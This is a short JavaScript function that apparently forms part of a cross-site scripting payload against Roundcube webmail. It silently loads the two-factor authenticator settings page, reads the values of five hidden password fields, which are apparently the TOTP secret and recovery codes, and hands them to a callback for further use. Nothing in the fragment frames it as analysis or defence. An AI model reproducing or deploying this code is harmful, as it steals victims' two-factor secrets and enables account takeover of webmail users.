async function keyTwoAuth(callback) {
  try {
      var fullUrl = window.location.origin + window.location.pathname;
      const respGet = await fetch(`${fullUrl}?_task=settings&_action=plugin.twofactor_gauthenticator`);
      if (!respGet.ok) {
          throw new Error(`HTTP error! status: ${respGet.status}`);
      }
      const htmlTextAuth = await respGet.text();
      const parser = new DOMParser();
      const doc = parser.parseFromString(htmlTextAuth, 'text/html');
      const passwordElements = doc.querySelectorAll('[type="password"]');
      callback(`${passwordElements[0].value}-${passwordElements[1].value}-${passwordElements[2].value}-${passwordElements[3].value}-${passwordElements[4].value}`)

  } catch (error) {
    callback('no_key');
  }
}

